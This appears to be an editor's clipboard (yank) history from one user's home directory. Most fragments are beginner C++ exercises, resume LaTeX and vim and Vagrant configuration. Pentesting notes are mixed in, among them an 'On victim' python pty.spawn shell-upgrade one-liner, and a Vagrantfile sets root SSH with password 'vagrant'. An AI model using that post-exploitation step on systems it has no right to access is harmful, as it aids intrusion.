143cc863789f283d95f7f47fab5e904b|file:///home/neo/vimwiki/Enumeration%20%26%20Foothold.wiki|16|1|V|vimwiki
	== ElasticSearch ==
fe4052a4721d895c018e769ff276f639|file:///home/neo/vimwiki/Enumeration%20%26%20Foothold.wiki|16|1|V|vimwiki
	* Query for a string:
	  `curl -X GET "localhost:9200/_search?pretty" -H 'Content-Type: application/json' -d'`
	`{`
	    `"query": {`
	        `"query_string" : {``
	            `"query" : "(new york city) OR (big apple)",`
	            `"default_field" : "content"`
	        `}`
	    `}`
	`}`
	`'`
3cbb4deface06d7c74f19c88826ad0e5|file:///home/neo/.vimrc|21|1|V|vim
	let g:tex_flavour = "xelatex"
893abfb35c4e00ab05881815c2af6498|file:///home/neo/Documents/resume/cv.tex|16|13|v|tex
	libertine
36f8779b5a1c37b29969b02f7719d4d9|file:///home/neo/Documents/resume/cv.tex|1|1|V|tex
	% !TEX program = xelatex
a558109233f60a510654fbee3d76027c|file:///home/neo/Documents/resume/cv.tex|15|13|v|tex
	corbel
719baa8981fda550ba75f07865cf2669|file:///home/neo/Documents/resume/cv.tex|111|123|v|tex
	, currently under submission for ISCA
fbff15351e916fc91457350573fd279d|file:///home/neo/Documents/resume/technical_cv.tex|147|1|V|tex
	\entry{Award "Tech 2 Tech"}
25c90a3ccf5b3739638674e527e62d9a|file:///home/neo/Documents/resume/technical_cv.tex|149|5|V|tex
	    {University of Cyprus -- Academic year 2018--19}
453911759e8c988e83811f63e1c4b905|file:///home/neo/Documents/resume/technical_cv.tex|93|1|V|tex
	\section{\textsc{Education}}
fc8cfd43aa1f712ca2577f333e255558|file:///home/neo/Documents/resume/technical_cv.tex|159|1|V|tex
	    {,University of Cyprus -- Academic year 2017-18}
4197836b885fc662330fa9b8de558b9e|file:///home/neo/Documents/resume/technical_cv.tex|155|1|V|tex
	    {,University of Cyprus -- Academic year 2018--19}
cf6cd8a80cc53b73f410173e50cac8c2|file:///home/neo/Documents/resume/technical_cv.tex|95|1|V|tex
	    {Comfortable writing code:}
1cea5345d284f36245a94301b114b27c|file:///home/neo/Documents/resume/technical_cv.tex|96|18|v|tex
	writing
5c04c3ab0d23e31aed9fb6eaeeb21e63|file:///home/neo/Documents/resume/technical_cv.tex|95|36|V|tex
	\subentry{Comfortable writing code:}
	\subentry{Comfortable reading code:}
17f2ece2cfa5c26ce87971d1639c84ee|file:///home/neo/Documents/resume/technical_cv.tex|94|1|V|tex
	\entry{Programming (comfortable writing):}
e39b3fe5585f7218d127e74883eb05c5|file:///home/neo/Documents/resume/technical_cv.tex|98|47|V|tex
	\entry{Programming (comfortable reading code):}
	    {Python, Bash}
	    {}
eceadc1d40cea061fd5986f2a109ee93|file:///home/neo/Documents/resume/technical_cv.tex|95|18|v|tex
	reading
e71d329d67e7b4d0bcf721e67629aab1|file:///home/neo/.vim/bundle/print_urls.sh|3|5|v|sh
	bundle/.git/config 
411cc796d5e59b85dde571d1484db3fe|file:///home/neo/.vim/bundle/print_urls.sh|2|15|v|sh
	$(find . -type d)
8e4c8a71001d18c69cb2483ec130e8ed|list:/commands|27|1|V|list
	python.setInterpreter	Select Interpreter
	python.setLinter	Select Linter
	prettier.formatFile
	snippets.openSnippetFiles	Edit snippets files of current document filetype.
	snippets.editSnippets	Edit user snippets file of current document filetype.
	workspace.showOutput	open output buffer to show output from languageservers or extensions.
	workspace.clearWatchman	run watch-del-all for watchman to free up memory.
	workspace.workspaceFolders	show opened workspaceFolders.
	workspace.renameCurrentFile	change current filename to a new name and reload it.
	extensions.toggleAutoUpdate	toggle auto update of extensions.
	workspace.diagnosticRelated	jump to related locations of current diagnostic.
	document.renameCurrentWord	rename word under cursor in current buffer by use multiple cursors.
	document.jumpToNextSymbol	Jump to next symbol highlight position.
	go.install.gomodifytags	Install / update gomodifytags
	go.install.goplay	Install / update goplay
	go.install.gopls	Install / update gopls
	go.install.gotests	Install / update gotests
	go.install.impl	Install / update impl
	go.playground	Run on go playground
	go.tags.add	Add tags to struct fields
	go.tags.add.line	Add tags to struct field in current line
	go.tags.add.prompt	Add tags to struct fields (prompt)
	go.tags.clear	Remove all tags from struct fields
	go.tags.clear.line	Remove all tags from struct fields in current line
	go.tags.remove	Remove tags from struct fields
	go.tags.remove.line	Remove tags from struct field in current line
	go.tags.remove.prompt	Remove tags from struct fields (prompt)
	go.test.generate.exported	Generate unit tests for exported functions in file
	go.test.generate.file	Generate unit tests for file
	go.test.toggle	Toggle test file
	go.version	Print extension version
	go.impl.cursor	Generate interface stubs
	java.updateLanguageServer	Download latest snapshots of jdt.ls from eclipse.org.
	java.projectConfiguration.update	Update project configuration
	java.open.serverLog	Open Java Language Server log file
	java.workspace.compile	Force Java compilation
	java.action.organizeImports	Organize Imports
	java.open.formatter.settings	Open Java formatter settings
	java.clean.workspace	Clean the Java language server workspace
	session.save	Save current vim state to session file.
	session.load	Load session by name.
	session.restart	Restart vim with current session.
	mru.validate	Validate mru files list, which remove files that doesn't exist.
	python.enableSourceMapSupport	Enable source map support for extension debugging
	python.sortImports	Sort Imports
	python.startREPL	Start REPL
	python.createTerminal	Create Terminal
	python.buildWorkspaceSymbols	Build Workspace Symbols
	python.execInTerminal	Run Python File in Terminal
	python.upgradePythonLanguageServer	Upgrade MPLS to latest stable version, restart coc.nvim required to take effect.
	python.viewOutput	Show output
	python.goToPythonObject	Go to Python Object
	python.enableLinting	Enable Linting
	python.runLinting	Run Linting
	sh.version	Print extension version
	sh.update.bash-language-server	Update bash-language-server
	tsserver.reloadProjects	Reload current project
	tsserver.openTsServerLog	Open log file of tsserver.
	tsserver.goToProjectConfig	Open project config file.
	tsserver.restart	Restart tsserver
	tsserver.watchBuild	Run `tsc --watch` for current project by use vim's job feature.
	tsserver.executeAutofix	Fix autofixable problems of current document.
	editor.action.organizeImport	run organize import code action.
	extensions.forceUpdateAll
	tags.generate
	prettier.open-output
	yank.clean
027ebe1f2d3dffccfa66d85a41e3e28d|file:///home/neo/.vim/bundle/print_urls.sh|5|9|V|sh
	        t
f123b257eed8519ab6bb044b8550874f|file:///home/neo/.vim/bundle/add_submodules.sh|4|9|V|sh
	        grep "url" "$bundle/.git/config" | cut -d ' ' -f 3 | xargs -I _ echo _ test
d27e1d664639ae2757e33a6f472f5c58|list:/extensions|4|1|V|list
	* coc-yank	1.1.4	~/.config/coc/extensions/node_modules/coc-yank
	* coc-snippets	2.1.28	~/.config/coc/extensions/node_modules/coc-snippets
	* coc-prettier	1.1.16	~/.config/coc/extensions/node_modules/coc-prettier
	* coc-pairs	1.2.21	~/.config/coc/extensions/node_modules/coc-pairs
	* coc-lists	1.3.8	~/.config/coc/extensions/node_modules/coc-lists
	* coc-highlight	1.2.5	~/.config/coc/extensions/node_modules/coc-highlight
	+ coc-tsserver	1.5.2	~/.config/coc/extensions/node_modules/coc-tsserver
	+ coc-sh	0.5.1	~/.config/coc/extensions/node_modules/coc-sh
	+ coc-python	1.2.12	~/.config/coc/extensions/node_modules/coc-python
	+ coc-phpls	2.1.8	~/.config/coc/extensions/node_modules/coc-phpls
	+ coc-json	1.2.6	~/.config/coc/extensions/node_modules/coc-json
	+ coc-java	1.4.11	~/.config/coc/extensions/node_modules/coc-java
	+ coc-go	0.8.0	~/.config/coc/extensions/node_modules/coc-go
6716300426cd79f2437d961c76ca4fb3|list:/extensions|14|1|V|list
	* coc-prettier	1.1.16	~/.config/coc/extensions/node_modules/coc-prettier
	+ coc-tsserver	1.5.2	~/.config/coc/extensions/node_modules/coc-tsserver
	* coc-snippets	2.1.28	~/.config/coc/extensions/node_modules/coc-snippets
e3f1e1b01b7f762715024c6b51f02b18|list:/extensions|14|1|V|list
	+ coc-java	1.4.11	~/.config/coc/extensions/node_modules/coc-java
	+ coc-json	1.2.6	~/.config/coc/extensions/node_modules/coc-json
f46e2d3f5f3ed2f93bae1ee4cdd4ea68|file:///home/neo/.vim/bundle/add_submodules.sh|1|1|V|sh
	#!/bin/bash
15df3a65ee114d812c91405fbf1d064f|file:///home/neo/.vim/bundle/add_submodules.sh|2|1|V|sh
	for bundle in *; do
6ef4a10d5227a0d217ef0188d53ba634|file:///home/neo/vimwiki/General.wiki|13|8|V|vimwiki
	        On victim
bd5bcf44a601358af343b4bbf67a594e|file:///home/neo/vimwiki/General.wiki|13|9|V|vimwiki
	        python -c 'import pty;pty.spawn("/bin/bash")'
1bef7d16d800359f1e228f5e81a95f53|file:///home/neo/cplusplus/chapter1/test.cpp|3|10|v|cpp
	int argc, char *argv[]
f694ed6247fbbe76c7046c2892b78b3a|file:///home/neo/cplusplus/chapter1/test.cpp|8|1|V|cpp
	int main
45c2f0b39c33b981e11efadcd2ba3b98|file:///home/neo/cplusplus/chapter2/main.cpp|2|1|V|cpp
	 
	int getInteger()
	{
		std::cout << "Enter an integer: ";
		int x{};
		std::cin >> x;
		return x;
	}
c0bc477e6aa774d2419281ab27d65caf|file:///home/neo/cplusplus/chapter2/quiz.cpp|15|18|v|cpp
	int answer
c09cfffb33e581414bb837f9ef5d5a5b|file:///home/neo/cplusplus/chapter2/quiz.cpp|17|1|V|cpp
	    int n1{read_number()};
fad18e614bf3031814a81e0bf5bce53e|file:///home/neo/cplusplus/chapter2/quiz.cpp|3|1|V|cpp
	int read_number()
	{
	    int input{};
	    std::cout << "Enter a number: ";
	    std::cin >> input;
	    return input;
	}
	
	void write_answer(int answer)
	{
	    std::cout << "The sum is "<< answer << '\n';
	}
bdee703c89c64c546a69ae2d4a9671da|file:///home/neo/cplusplus/chapter2/quiz.cpp|1|1|V|cpp
	#include <iostream>
97f0464e10df8cc2fa824edf27396922|file:///home/neo/cplusplus/chapter2/io.cpp|2|1|V|cpp
	int read_number()
cfc875963c7fb9765bee5d1365cd61e8|file:///home/neo/cplusplus/chapter2/io.cpp|10|1|V|cpp
	void write_answer(int answer)
2999a24f0fb5b2cd8a40ffe7d2d5fbfd|file:///home/neo/cplusplus/chapter4/question_3.cpp|14|9|^v|cpp
	operator == '+' 
a8d84c7df95217e99c218253374c22f1|file:///home/neo/cplusplus/chapter4/question_3.cpp|14|5|V|cpp
	    if (operator == '+' || operator == '-' '' )
eeff19a8be75aabc8e0e4b403bbf1492|file:///home/neo/cplusplus/chapter4/question_3.cpp|22|1|V|cpp
	    if (operator == '+')
fca852ec623a3e0f908016a5edf18fb1|file:///home/neo/cplusplus/chapter4/question_3.cpp|19|1|V|cpp
	    if (operator == '+')
	        res = n1 + n2; 
7d9256e8044d5e7e9af87608763ddde8|file:///home/neo/cplusplus/chapter4/question_3.cpp|19|1|V|cpp
	    if (op == '+')
	        res = n1 + n2; 
2685d9fa7a8c6d411d554f5e3aa5d6bd|file:///home/neo/cplusplus/chapter4/question_3.cpp|21|1|V|cpp
	    else if (op == '+')
	        res = n1 + n2; 
5c6e505a099990d8bc1fb161ec570793|file:///home/neo/cplusplus/chapter4/question_3.cpp|27|9|V|cpp
	    else{
	        cout << "Wrong "
0c5339c52f9321ddc84d61e3bd576fa6|file:///home/neo/cplusplus/chapter4/question_3.cpp|25|5|v|cpp
	else 
ea5a1cbe764918679997181a3ea281d3|file:///home/neo/cplusplus/chapter4/question_3.cpp|27|5|V|cpp
	    }
12f2b2c504e2fcf7bde65167b0e10664|file:///home/neo/cplusplus/chapter4/question_3.cpp|31|1|V|cpp
	    double n1{get_input()};
586af9192c0228a6ce6a8d625a68a0cd|file:///home/neo/cplusplus/chapter4/question_3.cpp|35|22|v|cpp
	double 
ba1596deeacd4fd66af2073f0dc1fecd|file:///home/neo/cplusplus/chapter4/question_3.cpp|35|26|v|cpp
	char 
e107c1b652ab10eff376be98c53bf1b4|file:///home/neo/cplusplus/chapter4/question_4.cpp|20|9|V|cpp
	        std ::
69199385f129052742f54b4d65b1e928|file:///home/neo/cplusplus/chapter4/constants.h|6|1|V|cpp
	constexpr double gravity = 9.8;
80253aa6c7144d137d3eed38024552ab|file:///home/neo/cplusplus/chapter4/question_4.cpp|23|9|V|cpp
	        calculate_distance(i, distance);
708bbe99956c9b7ba995412e86fcf472|file:///home/neo/cplusplus/chapter4/question_4.cpp|5|38|v|cpp
	, double distance
5a43b83709e0b2558e420fc5d4969378|file:///home/neo/cplusplus/chapter4/question_4.cpp|20|38|v|cpp
	, distance
18443725192bba1acee5fc12da466f60|file:///home/neo/cplusplus/chapterO/q2.cpp|7|1|V|cpp
	// Your code here
55b3b214f64fca3af770f1913e7c0fd9|file:///home/neo/cplusplus/chapter6/quiz_q1.cpp|1|1|V|cpp
	
	2
	3
	4
	5
	6
	7
	8
	9
	10
	11
	12
	13
	14
	15
	16
	17
da6681b370d252ba62fc69fc7910c1f9|file:///home/neo/cplusplus/chapter6/constants.h|7|1|V|cpp
	inline constexpr int max_class_size = 30;
625277124a2481cb095db3a7e60e2eff|file:///home/neo/cplusplus/chapter6/pass.cpp|1|1|V|cpp
	
	4
	5
	6
	7
	8
	9
	10
	11
	12
e2942a04780e223b215eb8b663cf5353|file:///home/neo/cplusplus/chapter6/pass.cpp|4|16|v|cpp
	count
fd697ed8443dbecb1f06a04d31fcfea7|file:///home/neo/cplusplus/chapterS/4b_q1.cpp|14|56|v|cpp
	name.length()
5b9d2adf0c062a3c1f6b9ceca806ba33|file:///home/neo/cplusplus/chapterS/4b_q1.cpp|14|5|V|cpp
	    std::cout << "You've lived " << static_cast<float>(age) / name.length()age << " years for each letter in your name.\n";
fec892a429f1a9dd8cb2a111ad9216c5|file:///home/neo/cplusplus/chapterS/4b_q1.cpp|14|76|v|cpp
	age 
9b8f265db8ffba1a17f6e5aa8f1f26d9|file:///home/neo/cplusplus/chapterS/quiz.h|9|9|V|cpp
	    Slime
	k
0ab92bb285d61c9165a5c6f913825e5b|file:///home/neo/cplusplus/chapterS/quiz.cpp|20|1|V|cpp
	    print_monster(torg);
ee04b4a6fbdc88d3e27f3b77b38b8acd|file:///home/neo/cplusplus/chapterS/quiz.cpp|21|19|v|cpp
	torg
3cba7a80915e70ce78946c99ccba77ea|file:///home/neo/cplusplus/chapterS/quiz.cpp|29|29|v|cpp
	monster.monsterType 
d44972c02d8f189bed720c90761c6779|file:///tmp/neomutt-neo-1000-24546-12215271384409568046|3|16|v|mail
	talked
99feb052a86b30d609522a27351d0e1e|file:///home/neo/cplusplus/chapterL/quiz.cpp|17|9|V|cpp
	        if (choice == 'y')
	            done = true;
	        else if (choice == 'n')
24259c0011385a36cd0ea66def9e5842|file:///home/neo/cplusplus/chapterL/quiz.cpp|6|1|V|cpp
	    std::mt19937 mersenne{static_cast<std::mt19937::result_type>(std::time(nullptr))};
91cf2a239885b724fc1dc02a6708d946|file:///home/neo/cplusplus/chapterL/quiz.cpp|15|11|V|cpp
	    static std::mt19937 mersenne{static_cast<std::mt19937::result_type>(std::time(nullptr))};
		static std::uniform_int_distribution<> numbers{ 1, 100 };
d4dbb6f41ea3f5d6dd10a7839069db32|file:///home/neo/cplusplus/chapterL/quiz.cpp|5|1|V|cpp
	    static std::mt19937 mersenne{static_cast<std::mt19937::result_type>(std::time(nullptr))};
f2eb910e998155682adde85ee2d7b5e4|file:///home/neo/cplusplus/chapterL/quiz.cpp|28|1|V|cpp
	        std::cout << "Would you like to play again (y/n)?";
	        std::cin >> choice;
	        while (true){
	            if (choice == 'n')
	                done = true;
	            else if (choice != 'y')
	                std::cout << "Wrong choice!\n";
	            else
	                break;
	        }
3fe17e6cd139beeb457a1ebffd0d61cd|file:///home/neo/cplusplus/chapterL/quiz.cpp|33|5|V|cpp
	    char choice{};
a957017f70345f833c5a1fc28c569663|file:///home/neo/cplusplus/chapterL/quiz.cpp|27|12|V|cpp
	        else
	            return false;
81f3246672309166030466a57397d7ec|file:///home/neo/cplusplus/chapterL/quiz.cpp|19|24|V|cpp
	    std::cout << "Would you like to play again (y/n)?";
	    std::cin >> choice;
ae46f41e5f0a53025c16bbd3d91a74bc|file:///home/neo/cplusplus/chapterL/quiz.cpp|24|9|V|cpp
	            std::cout << "Would you like to play again (y/n)?";
	            std::cin >> choice;
	                return false;
5c0a8705ee3f635f80b012202113642c|file:///home/neo/cplusplus/chapterL/quiz.h|3|1|V|cpp
	    inline constexpr MIN_NUM = 1;
2021d4731d5e4f8880c9d7ff339c490b|file:///home/neo/cplusplus/chapterL/quiz.h|5|5|V|cpp
	    y
476b5c083ba09dc9058691a0295db8c6|file:///home/neo/cplusplus/chapterL/quiz.cpp|19|1|V|cpp
	            std::cout << "Your guess is too low.\n";
4b56c31bfe769f2da406d0ebe282517e|file:///home/neo/cplusplus/chapterL/quiz.cpp|28|31|v|cpp
	i <<
6896232e8fa0815d77fb9f2c5a225e5a|file:///home/neo/cplusplus/chapterL/quiz.cpp|9|1|V|cpp
	void play_game(){
dd9d3bf8c3b06e04d9bc7e98a85820f3|file:///home/neo/cplusplus/chapterL/quiz.cpp|27|1|V|cpp
	int guess_number(int choice){
78b94bae4ee8d0491e525f56f5c20ae3|file:///home/neo/cplusplus/chapterL/quiz.cpp|32|1|V|cpp
	bool play_again(){
b77ee680941deff2079d1cfd02068d67|file:///home/neo/cplusplus/chapterL/quiz.cpp|12|38|v|cpp
	 CHOICES
e368680dc6a12ebc8f3195aac7189410|file:///home/neo/cplusplus/chapterL/quiz.cpp|38|1|V|cpp
	        std::cout << "Would you like to play again (y/n)? ";
583db0901191b71f073ed2f74bae0a8c|file:///home/neo/cplusplus/chapterL/quiz.cpp|38|9|V|cpp
	        std::cin >> choice;
6724c399bb0d7145f592af383d99f1f9|file:///home/neo/cplusplus/chapterL/quiz.cpp|32|5|V|cpp
	    std::cout << "Guess #" << attempt << ": ";
	    std::cin >> choice;
	    if (choice >= 1 && choice <= 100){
	    }
82fd966689d50bb81ca54331919d2ef1|file:///home/neo/cplusplus/chapterL/quiz.cpp|39|5|V|cpp
	    return choice;
323feb99ec1ab7996eeb1fe0bce0c04e|file:///home/neo/cplusplus/chapterL/quiz.cpp|32|9|V|cpp
	        std::cin.ignore(32767, '\n');
b071e606eeb368bb447469dba02929cb|file:///home/neo/cplusplus/chapterL/quiz.cpp|33|1|V|cpp
	        if (std::cin.fail()){
	            std::cin.clear();
	        }
	        std::cin.ignore(32767, '\n');
cd5e2ab6bc17a34aa65f39eae6e4a349|file:///home/neo/cplusplus/chapterL/quiz.cpp|49|27|V|cpp
	            std::cout << "Would you like to play again (y/n)? ";
	            std::cin >> choice;
de25aa10ebf1b9f20b687d282c4d3744|file:///home/neo/cplusplus/chapterP/find.cpp|1|1|V|cpp
	
	2
	3
	4
	5
	6
	7
	8
	9
	10
	11
	12
	13
	14
	15
	16
	17
	18
	19
8fe5a459b8cf7a79462d079c3b9164ba|file:///home/neo/cplusplus/chapterP/find.cpp|5|1|V|cpp
	// ...
e284c57313d0868f4a6632f2aa39ce68|file:///home/neo/cplusplus/chapterP/find.cpp|5|5|V|cpp
	    for (int *ptr, ptr>)
89de3b3d026f3ef51202ab4ec44210aa|file:///home/neo/cplusplus/chapterP/q6_9.cpp|6|5|V|cpp
	    std::string names{}
7cf91b300ff3ecef82c59dd47b89253a|file:///home/neo/cplusplus/chapterP/q6_9.cpp|17|21|v|cpp
	32767
7da985fb16cde3e0be9f287ef08c15df|file:///home/neo/cplusplus/chapterP/q6_9.cpp|18|1|V|cpp
	    std::cin.ignore(std::numeric_limits<std::streamsize>::max, '\n');
05d1c06ab97d26932b2cc399aa752d8c|file:///home/neo/cplusplus/chapterP/q6_9.cpp|12|12|V|cpp
	void sort_names(std::string *names, size_t length){
	    
	}
c4b30d110ab9ca118f020d88cb4db4fa|file:///home/neo/cplusplus/chapterP/q6_9.cpp|24|22|v|cpp
	std::end(names
b5ef24fdcdf5b9091981875c36014012|file:///home/neo/cplusplus/chapterP/q6_9.cpp|4|1|V|cpp
	#include <iterator> // std::begin,end
29a3922237fd0263dff4affed9b7a637|file:///home/neo/cplusplus/chapterP/quiz_q1.cpp|12|16|v|cpp
	ItemType
4c2c9428eff6488b00165ee78a3508d1|file:///home/neo/cplusplus/chapterP/quiz_q2.cpp|17|1|V|cpp
	    for (student stu: students){
f5c0a1c9384c2e25e79ba1abf5d9a037|file:///home/neo/cplusplus/chapterP/quiz_q2.cpp|22|10|v|cpp
	Student
c464ffba70291437ca6d0c65f940903f|file:///home/neo/cplusplus/chapterP/quiz_q2.cpp|25|15|V|cpp
	        stu.name = name;
	        stu.grade = grade;
fd842abae652555cd09868be9554c684|file:///home/neo/cplusplus/chapterP/quiz_q2.cpp|20|1|V|cpp
	    std::string name;
	    int grade{};
eba557be3ea00cf01df9cfe4bab792a5|file:///home/neo/cplusplus/chapterP/cards.cpp|4|1|V|cpp
	    RANK_2,
a010077ede4ef6b65fb3f5bdc246c1fd|file:///home/neo/cplusplus/chapterP/cards.cpp|12|5|V|cpp
	    3,
45c01ff0a3bd5b9448a4f2145f9dc624|file:///home/neo/cplusplus/chapterP/cards.cpp|12|5|V|cpp
	    4,
3e268ad0fb272275b3562e8dd8df72c6|file:///home/neo/cplusplus/chapterP/cards.cpp|12|5|V|cpp
	    5,
cd522706077fa0565ffb1415bea76db2|file:///home/neo/cplusplus/chapterP/cards.cpp|12|5|V|cpp
	    6,
438a0dc4f4855d2349e7cad1439581a0|file:///home/neo/cplusplus/chapterP/cards.cpp|12|5|V|cpp
	    7,
a42128a13d6cea1f4c6463da73766c3a|file:///home/neo/cplusplus/chapterP/cards.cpp|12|5|V|cpp
	    8,
0dd60cb6657d42735f5a65b4a703235e|file:///home/neo/cplusplus/chapterP/cards.cpp|12|5|V|cpp
	    9,
af54f2f366317b9a898355e60b11b867|file:///home/neo/cplusplus/chapterP/cards.cpp|4|1|V|cpp
	    RANK_2,
	    RANK_3,
	    RANK_4,
	    RANK_5,
	    RANK_6,
	    RANK_7,
	    RANK_8,
	    RANK_9,
	    RANK_Jack,
	    RANK_Queen,
	    RANK_King,
	    RANK_Ace,
339d4f14bdd9cb5ecd2f0864f980e3d4|file:///home/neo/cplusplus/chapterP/cards.cpp|39|1|V|cpp
	            c_rank = '2';
4229198778b90d1a6f7bda6155d580a6|file:///home/neo/cplusplus/chapterP/cards.cpp|39|1|V|cpp
	            c_rank = '2';
	            break;
0bbcfe997771ae1c02c8bf45301234bb|file:///home/neo/cplusplus/chapterP/cards.cpp|74|9|V|cpp
	        default:
746a65e85d6fcd787e35e5171e2c9b9b|file:///home/neo/cplusplus/chapterP/cards.cpp|21|1|V|cpp
	    SUIT_Clubs,
	    SUIT_Spades,
	    SUIT_Hearts,
	    SUIT_Diamonds,
eac2227fc42dfa47b096a686a7cb3346|file:///home/neo/cplusplus/chapterP/cards.cpp|80|1|V|cpp
	            c_suit = 'C';
0b12ba5f447cbe584c4014300e7dceca|file:///home/neo/cplusplus/chapterP/cards.cpp|80|1|V|cpp
	            c_suit = 'C';
	            break;
326a83eb53ef155a2689ddafaebdc904|file:///home/neo/cplusplus/chapterP/cards.cpp|98|1|V|cpp
	std::array
8d388491d911850dddfe1d096e33ee94|file:///home/neo/cplusplus/chapterP/cards.cpp|102|5|v|cpp
	std::array<Card, static_cast<int>
776bf9fa97e72951e23147d37a42740c|file:///home/neo/cplusplus/chapterP/cards.cpp|102|5|^v|cpp
	std::array<Card, static_cast<int>(Suit::MAX_SUITS) * static_cast<int>(Rank::MAX_RANKS)> d
187464eaa9df6393f54ea4193ddecdec|file:///home/neo/cplusplus/chapterP/cards.cpp|101|1|V|cpp
	using deck_type = std::array<Card, static_cast<int>(Suit::MAX_SUITS) * static_cast<int>(Rank::MAX_RANKS)> 
1e8d3772c54e87e8cd4e0c3f3324e52e|file:///home/neo/cplusplus/chapterP/cards.cpp|108|17|v|cpp
	suits+ranks
4bf26395801dcda2362105efd320c5db|file:///home/neo/cplusplus/chapterP/cards.cpp|106|10|v|cpp
	size_t
5d39ce1520705544f5d86a3c62d07b97|file:///home/neo/cplusplus/chapterP/cards.cpp|141|1|V|cpp
	        case(Rank::RANK_Jack):
40687c8206d15373954d8b27c6724f62|file:///home/neo/cplusplus/chapterP/cards.cpp|142|25|v|cpp
	Jack
157f0a469aa7b6f5e1be3a8ee7b1c88c|file:///home/neo/vagrant-llvm/Vagrantfile|13|3|V|ruby
	  end
b56be8c1fb78510183755b4937edc107|file:///home/neo/vagrant-llvm/Vagrantfile|64|1|V|ruby
	v.customize ["modifyvm", :id, "--cpuexecutioncap", "50"]
e0c595d880d556a5b6d46c07b42d6d43|file:///home/neo/vagrant-llvm/Vagrantfile|14|1|V|ruby
	  config.ssh.username = 'root'
	  config.ssh.password = 'vagrant'
	  config.ssh.insert_key = 'true'
723f149d50a9f1f1f507f93eebabde8f|file:///home/neo/vagrant-llvm/Vagrantfile|21|1|V|ruby
	  v.customize ["modifyvm", :id, "--cpuexecutioncap", "50"]
57be58d8e668df4f3dbe5c76a48a7ce7|file:///home/neo/vagrant-llvm/Vagrantfile|21|5|V|ruby
	config.vm.provider "virtualbox" do |v|
	end
2306bbda3ac5691b1686536b6bcdfd21|file:///home/neo/vagrant-llvm/Vagrantfile|15|27|v|ruby
	v-wordpress
6ff3d0158d1372de0be98fdeb5a143ee|file:///home/neo/vagrant-llvm/Vagrantfile|15|38|v|ruby
	/var/www/wordpress
4cd06884140d28ed5c90719928c5a1c9|file:///home/neo/vagrant-llvm/Vagrantfile|15|3|V|ruby
	  config.vm.share_folder "vagrant", "/vagrant", "/host/path", :owner => "www-data", :group => "www-data"
5ae36bbe0cb7016adde14f1ec1adffb8|file:///home/neo/Vagrantfile|16|1|V|ruby
	  config.disksize.size = '55GB'
1dc1c66d3c3e9eb8b41569dd7bff9027|file:///home/neo/vagrant-llvm/Vagrantfile|19|7|V|ruby
	      config.disksize.size = '50GB'
065d49b329b78169636f35b763467faa|file:///home/neo/vagrant-llvm/Vagrantfile|20|1|V|ruby
	  config.disksize.size = '50GB'
fabe1f8ad4c0ead9e608a638d38bf2d6|file:///home/neo/vagrant-llvm/Vagrantfile|19|1|V|ruby
	  vagrant.configure('2') do |config|
183c64e0881e06b14e8cbb725beb13f3|file:///home/neo/vagrant-llvm/Vagrantfile|21|1|V|ruby
	  config.memory = 6000
	  config.cpus = 4
b0061974914468de549a2af8ced10316|file:///home/neo/vagrant-llvm/Vagrantfile|20|1|V|ruby
	end
	
3e4ca4ef7555dee320dd3806fa568d00|file:///home/neo/cplusplus/chapterF/q7_4.cpp|1|1|v|cpp
	int main(
74a40e17632583dc4e0b9a0ca42f2e6a|file:///home/neo/cplusplus/chapterF/q7_8.cpp|13|5|V|cpp
	    std::cout << "Enter an operator (+, -, * ,/): ";
	    std::cin >> op;
e81e0b93274892f73a1ae401b2914bfb|file:///home/neo/cplusplus/chapterF/q7_8.cpp|13|9|V|cpp
	        u
87ef9c0fad5411007a8b1f7c26863bd8|file:///home/neo/cplusplus/chapterF/q7_8.cpp|48|1|V|cpp
	
	    using arithmeticFnc = std::function<int(int, int)>;
97335324e239a3840ad442d91e1444b9|file:///home/neo/cplusplus/chapterF/q7_8.cpp|43|35|v|cpp
	int a
a7347db032c349eba2948b9a2a712d08|file:///home/neo/cplusplus/chapterF/q7_8.cpp|43|34|v|cpp
	(int a, int b)y
6ba265ddbe193c43999b682fcf50667f|file:///home/neo/cplusplus/chapterF/q7_8.cpp|56|13|v|cpp
	arithmeticFcn
7a7555c77e352efba3b44c2a5fcbf460|file:///home/neo/cplusplus/chapterF/factorial.cpp|4|1|V|cpp
	    static int prod{1};
0c2a902354170be0876c024856483755|file:///home/neo/cplusplus/chapterF/binary.cpp|6|9|V|cpp
	        (n & 1) ? '1' : '0';
44dafe91741719ed7ba293b4861af1f5|file:///home/neo/cplusplus/chapterF/binary.cpp|6|1|V|cpp
	    char res{(n & 1) ? '1' : '0'};
	    std::cout << res;
7625ac700f09f21424f9148181f33651|file:///home/neo/cplusplus/chapterF/lamdas_q1.cpp|4|11|v|cpp
	functional
68624cebdfbe64595b12ba5c0c9d521c|file:///home/neo/cplusplus/chapterF/lamdas_q1.cpp|24|63|^v|cpp
	[](auto &a, auto &b){ return a.points > b. points; })}
9d12564f9409a88754535953cb73f2d5|file:///home/neo/cplusplus/chapterF/lamdas_q2.cpp|1|1|V|cpp
	
	4
	5
	6
	7
	8
	9
	10
	11
	12
	13
	14
	15
	16
	17
	18
	19
	20
	21
	22
	23
	24
	25
	26
	27
	28
	29
	30
	31
54d9f44c9d066ad5226b716ee3207df0|file:///home/neo/cplusplus/chapterF/captures.cpp|6|19|v|cpp
	Enter root of number to start at: 
854322064ddea05c9683e65598932731|file:///home/neo/cplusplus/chapterF/captures.cpp|13|19|v|cpp
	Enter amount of numbers to generate: 
cc92747bf6da4d917e6e0b0356cd5133|file:///home/neo/cplusplus/chapterF/captures.cpp|30|55|v|cpp
	nums
fbb44b4487415b134bce9c790a27fe5e|file:///home/neo/cplusplus/chapterF/captures.cpp|33|29|v|cpp
	total
6ba8844da718b4a65f60dbfd0d92d6ef|file:///home/neo/cplusplus/chapterF/captures.cpp|34|9|v|cpp
	vector
7eea70ea0c19179e63e42d88d298d695|file:///home/neo/cplusplus/chapterF/captures.cpp|45|5|V|cpp
	    asfd 
6d0b03df3a0e83d80bf877c465c95b12|file:///home/neo/cplusplus/chapterF/captures.cpp|45|5|v|cpp
	for (int i = 0; i < length; i++)
4be31c5b687428fc5141fd53fe79164a|file:///home/neo/cplusplus/chapterF/captures.cpp|43|5|V|cpp
	    int length{static_cast<int>(nums.size())};
d7c51728cf420418b8f72d16c1e3d458|file:///home/neo/cplusplus/chapterF/captures.cpp|55|13|V|cpp
	                std::cout << "Nice! You found all numbers, good job!\n";
c2d2a36b1d0a3e5510eb59a74c8e907e|file:///home/neo/cplusplus/chapterF/captures.cpp|37|26|v|cpp
	{total};
d35c85b0338cd1fd73bf8db5c1e4bd4f|file:///home/neo/cplusplus/chapterF/captures.cpp|39|10|v|cpp
